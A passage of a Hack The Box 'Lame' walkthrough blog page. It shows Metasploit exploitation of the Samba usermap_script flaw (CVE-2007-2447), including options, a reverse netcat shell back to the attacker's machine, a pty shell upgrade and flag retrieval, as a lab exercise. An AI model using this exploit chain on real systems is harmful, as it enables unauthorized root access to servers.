</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 372.12 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon/assets-found<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>Only <strong>two</strong> users appear to be <strong>enabled</strong>: <em>msfadmin</em> and <em>user</em>. Regarding the <strong>shares</strong>, the only <strong>one</strong> we are <strong>allowed access</strong> to is the - <em>\tmp</em> - <strong>share</strong> (not counting - <em>\IPC$</em> - usually empty or unimportant).</p><p>Interestingly enough, a quick <strong>online search</strong> reveals multiple potential <strong>attack vectors</strong>:</p><ul><li>possible <strong>default credentials</strong>: <em>msfadmin:msfadmin</em></li><li>potential <strong>msf exploit</strong> - <em>exploit/samba/usermap_script</em></li></ul><h2 id=exploitation><strong>EXPLOITATION</strong><a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Let&rsquo;s fire up the <strong>metasploit framework console</strong> and then check out the aforementioned <strong>exploit</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-dedivip-2<span class=o>]</span>─<span class=o>[</span>10.10.14.2<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-elmlfwe0dg<span class=o>]</span>─<span class=o>[</span>~/lame/1_recon/assets-found<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ msfconsole -q
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> &gt;&gt; use exploit/multi/samba/usermap_script 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/samba/usermap_script<span class=o>)</span> &gt;&gt; info
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       Name: Samba <span class=s2>&#34;username map script&#34;</span> Command Execution
</span></span><span class=line><span class=cl>     Module: exploit/multi/samba/usermap_script
</span></span><span class=line><span class=cl>   Platform: Unix
</span></span><span class=line><span class=cl>       Arch: cmd
</span></span><span class=line><span class=cl> Privileged: Yes
</span></span><span class=line><span class=cl>    License: Metasploit Framework License <span class=o>(</span>BSD<span class=o>)</span>
</span></span><span class=line><span class=cl>       Rank: Excellent
</span></span><span class=line><span class=cl>  Disclosed: 2007-05-14
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Provided by:
</span></span><span class=line><span class=cl>  jduck &lt;jduck@metasploit.com&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Available targets:
</span></span><span class=line><span class=cl>      Id  Name
</span></span><span class=line><span class=cl>      --  ----
</span></span><span class=line><span class=cl>  <span class=o>=</span>&gt;  <span class=m>0</span>   Automatic
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Check supported:
</span></span><span class=line><span class=cl>  No
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Basic options:
</span></span><span class=line><span class=cl>  Name    Current Setting  Required  Description
</span></span><span class=line><span class=cl>  ----    ---------------  --------  -----------
</span></span><span class=line><span class=cl>  RHOSTS                   yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https://docs.metasploit.com/doc
</span></span><span class=line><span class=cl>                                     s/using-metasploit/basics/using-metasploit.html
</span></span><span class=line><span class=cl>  RPORT   <span class=m>139</span>              yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Payload information:
</span></span><span class=line><span class=cl>  Space: <span class=m>1024</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Description:
</span></span><span class=line><span class=cl>  This module exploits a <span class=nb>command</span> execution vulnerability in Samba 
</span></span><span class=line><span class=cl>  versions 3.0.20 through 3.0.25rc3 when using the non-default 
</span></span><span class=line><span class=cl>  <span class=s2>&#34;username map script&#34;</span> configuration option. By specifying a username 
</span></span><span class=line><span class=cl>  containing shell meta characters, attackers can execute arbitrary 
</span></span><span class=line><span class=cl>  commands. No authentication is needed to exploit this vulnerability 
</span></span><span class=line><span class=cl>  since this option is used to map usernames prior to authentication!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>References:
</span></span><span class=line><span class=cl>  https://nvd.nist.gov/vuln/detail/CVE-2007-2447
</span></span><span class=line><span class=cl>  OSVDB <span class=o>(</span>34700<span class=o>)</span>
</span></span><span class=line><span class=cl>  http://www.securityfocus.com/bid/23972
</span></span><span class=line><span class=cl>  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id<span class=o>=</span><span class=m>534</span>
</span></span><span class=line><span class=cl>  http://samba.org/samba/security/CVE-2007-2447.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>View the full module info with the info -d command.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/samba/usermap_script<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>Once we made sure that the <strong>script</strong> does exactly what we desire, we list it&rsquo;s configuration <strong>settings</strong>.</p><pre tabindex=0><code>[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) &gt;&gt; show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/do
                                      cs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  64.227.43.138    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) &gt;&gt; 
</code></pre><p><strong>Two</strong> of the fields need some <strong>adjusting</strong>, namely <em>rhosts</em> and <em>lhost</em>. The first refers to our <strong>target</strong> machine ($rhost), the second one to our <strong>pwnbox</strong> (attacker machine).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/samba/usermap_script<span class=o>)</span> &gt;&gt; <span class=nb>set</span> rhosts 10.129.179.224
</span></span><span class=line><span class=cl><span class=nv>rhosts</span> <span class=o>=</span>&gt; 10.129.179.224
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/samba/usermap_script<span class=o>)</span> &gt;&gt; <span class=nb>set</span> lhost tun0
</span></span><span class=line><span class=cl><span class=nv>lhost</span> <span class=o>=</span>&gt; 10.10.14.2
</span></span><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/samba/usermap_script<span class=o>)</span> &gt;&gt;
</span></span></code></pre></div><p>Since no <strong>check</strong> support is available for this particular <strong>exploit</strong>, we simply <strong>ran it</strong> after the setup is finished.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>msf<span class=o>](</span>Jobs:0 Agents:0<span class=o>)</span> exploit<span class=o>(</span>multi/samba/usermap_script<span class=o>)</span> &gt;&gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.2:4444 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>1</span> opened <span class=o>(</span>10.10.14.2:4444 -&gt; 10.129.179.224:51537<span class=o>)</span> at 2023-05-26 02:21:48 +0100
</span></span></code></pre></div><p>The <strong>exploit</strong> does run <strong>successfully</strong> and provides us with a <strong>root shell</strong> to our <strong>target</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>root
</span></span></code></pre></div><p>But this <strong>shell connection</strong> appears to be <strong>neither stable</strong>, <strong>nor interactive</strong>, so our next course of action is to <strong>upgrade it</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>which python
</span></span><span class=line><span class=cl>/usr/bin/python
</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>root@lame:/# <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
</span></span><span class=line><span class=cl>root@lame:/# clear
</span></span><span class=line><span class=cl>clear
</span></span></code></pre></div><p>Even though the <em>echoing back</em> is not turned off, it&rsquo;s much more informative than before. <strong>Goofing around</strong> a bit get&rsquo;s us both the <strong>user</strong> and the <strong>root flag</strong>. All that&rsquo;s left for us is to simply <strong>grab</strong> them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@lame:/# <span class=nb>cd</span> /home/
</span></span><span class=line><span class=cl><span class=nb>cd</span> /home/
</span></span><span class=line><span class=cl>root@lame:/home# ls -lag
</span></span><span class=line><span class=cl>ls -lag
</span></span><span class=line><span class=cl>total <span class=m>24</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>6</span> root    <span class=m>4096</span> Mar <span class=m>14</span>  <span class=m>2017</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>21</span> root    <span class=m>4096</span> Oct <span class=m>31</span>  <span class=m>2020</span> ..
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> nogroup <span class=m>4096</span> Mar <span class=m>17</span>  <span class=m>2010</span> ftp
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> makis   <span class=m>4096</span> Mar <span class=m>14</span>  <span class=m>2017</span> makis
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> service <span class=m>4096</span> Apr <span class=m>16</span>  <span class=m>2010</span> service
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>3</span>    <span class=m>1001</span> <span class=m>4096</span> May  <span class=m>7</span>  <span class=m>2010</span> user
</span></span><span class=line><span class=cl>root@lame:/home# <span class=nb>cd</span> user
</span></span><span class=line><span class=cl><span class=nb>cd</span> user
</span></span><span class=line><span class=cl>root@lame:/home/user# ls -hla
</span></span><span class=line><span class=cl>ls -hla
</span></span><span class=line><span class=cl>total 28K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> <span class=m>1001</span> <span class=m>1001</span> 4.0K May  <span class=m>7</span>  <span class=m>2010</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root root 4.0K Mar <span class=m>14</span>  <span class=m>2017</span> ..
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> <span class=m>1001</span> <span class=m>1001</span>  <span class=m>165</span> May  <span class=m>7</span>  <span class=m>2010</span> .bash_history
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> <span class=m>1001</span> <span class=m>1001</span>  <span class=m>220</span> Mar <span class=m>31</span>  <span class=m>2010</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> <span class=m>1001</span> <span class=m>1001</span> 2.9K Mar <span class=m>31</span>  <span class=m>2010</span> .bashrc
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> <span class=m>1001</span> <span class=m>1001</span>  <span class=m>586</span> Mar <span class=m>31</span>  <span class=m>2010</span> .profile
</span></span><span class=line><span class=cl>drwx------ <span class=m>2</span> <span class=m>1001</span> <span class=m>1001</span> 4.0K May  <span class=m>7</span>  <span class=m>2010</span> .ssh
</span></span><span class=line><span class=cl>root@lame:/home/user# <span class=nb>cd</span> ../service
</span></span><span class=line><span class=cl><span class=nb>cd</span> ../service
</span></span><span class=line><span class=cl>root@lame:/home/service# ls -hla
</span></span><span class=line><span class=cl>ls -hla
</span></span><span class=line><span class=cl>total 20K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> service service 4.0K Apr <span class=m>16</span>  <span class=m>2010</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root    root    4.0K Mar <span class=m>14</span>  <span class=m>2017</span> ..
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> service service  <span class=m>220</span> Apr <span class=m>16</span>  <span class=m>2010</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> service service 2.9K Apr <span class=m>16</span>  <span class=m>2010</span> .bashrc
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> service service  <span class=m>586</span> Apr <span class=m>16</span>  <span class=m>2010</span> .profile
</span></span><span class=line><span class=cl>root@lame:/home/service# <span class=nb>cd</span> ../makis
</span></span><span class=line><span class=cl><span class=nb>cd</span> ../makis
</span></span><span class=line><span class=cl>root@lame:/home/makis# ls -hla
</span></span><span class=line><span class=cl>ls -hla
</span></span><span class=line><span class=cl>total 28K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> makis makis 4.0K Mar <span class=m>14</span>  <span class=m>2017</span> .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root  root  4.0K Mar <span class=m>14</span>  <span class=m>2017</span> ..
</span></span><span class=line><span class=cl>-rw------- <span class=m>1</span> makis makis 1.1K Mar <span class=m>14</span>  <span class=m>2017</span> .bash_history
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> makis makis  <span class=m>220</span> Mar <span class=m>14</span>  <span class=m>2017</span> .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> makis makis 2.9K Mar <span class=m>14</span>  <span class=m>2017</span> .bashrc
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> makis makis  <span class=m>586</span> Mar <span class=m>14</span>  <span class=m>2017</span> .profile
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> makis makis    <span class=m>0</span> Mar <span class=m>14</span>  <span class=m>2017</span> .sudo_as_admin_successful
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> makis makis   <span class=m>33</span> May <span class=m>25</span> 19:16 user.txt
</span></span><span class=line><span class=cl>root@lame:/home/makis# cat user.txt
</span></span><span class=line><span class=cl>cat user.txt
</span></span><span class=line><span class=cl>&lt;user-flag&gt;
</span></span><span class=line><span class=cl>root@lame:/home/makis# <span class=nb>cd</span> /root/
</span></span><span class=line><span class=cl><span class=nb>cd</span> /root/
</span></span><span class=line><span class=cl>root@lame:/root# ls -hla
</span></span><span class=line><span class=cl>ls -hla
</span></span><span class=line><span class=cl>total 80K
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>13</span> root root 4.0K May <span class=m>25</span> 19:16 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>21</span> root root 4.0K Oct <span class=m>31</span>  <span class=m>2020</span> ..
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root  <span class=m>373</span> May <span class=m>25</span> 19:16 .Xauthority
</span></span><span class=line><span class=cl>lrwxrwxrwx  <span class=m>1</span> root root    <span class=m>9</span> May <span class=m>14</span>  <span class=m>2012</span> .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root 2.2K Oct <span class=m>20</span>  <span class=m>2007</span> .bashrc
</span></span><span class=line><span class=cl>drwx------  <span class=m>3</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .config
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .filezilla
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>5</span> root root 4.0K May <span class=m>25</span> 19:16 .fluxbox
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .gconf
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .gconfd
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .gstreamer-0.10
</span></span><span class=line><span class=cl>drwx------  <span class=m>4</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .mozilla
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>141</span> Oct <span class=m>20</span>  <span class=m>2007</span> .profile
</span></span><span class=line><span class=cl>drwx------  <span class=m>5</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .purple
</span></span><span class=line><span class=cl>-rwx------  <span class=m>1</span> root root    <span class=m>4</span> May <span class=m>20</span>  <span class=m>2012</span> .rhosts
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> .ssh
</span></span><span class=line><span class=cl>drwx------  <span class=m>2</span> root root 4.0K May <span class=m>25</span> 19:16 .vnc
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>2</span> root root 4.0K May <span class=m>20</span>  <span class=m>2012</span> Desktop
</span></span><span class=line><span class=cl>-rwx------  <span class=m>1</span> root root  <span class=m>401</span> May <span class=m>20</span>  <span class=m>2012</span> reset_logs.sh
</span></span><span class=line><span class=cl>-rw-------  <span class=m>1</span> root root   <span class=m>33</span> May <span class=m>25</span> 19:16 root.txt
</span></span><span class=line><span class=cl>-rw-r--r--  <span class=m>1</span> root root  <span class=m>118</span> May <span class=m>25</span> 19:16 vnc.log
</span></span><span class=line><span class=cl>root@lame:/root# cat root.txt
</span></span><span class=line><span class=cl>cat root.txt
</span></span><span class=line><span class=cl>&lt;root-flag&gt;
</span></span><span class=line><span class=cl>root@lame:/root#
</span></span></code></pre></div><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All that&rsquo;s left for us to do is to simply <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/lame/>lame</a></li><li><a href=https://bluewalle.github.io/tags/samba/>samba</a></li><li><a href=https://bluewalle.github.io/tags/network/>network</a></li><li><a href=https://bluewalle.github.io/tags/vulnerability-assessment/>vulnerability-assessment</a></li><li><a href=https://bluewalle.github.io/tags/common-services/>common-services</a></li><li><a href=https://bluewalle.github.io/tags/outdated-software/>outdated-software</a></li><li><a href=https://bluewalle.github.io/tags/security-tools/>security-tools</a></li><li><a href=https://bluewalle.github.io/tags/metasploit/>metasploit</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>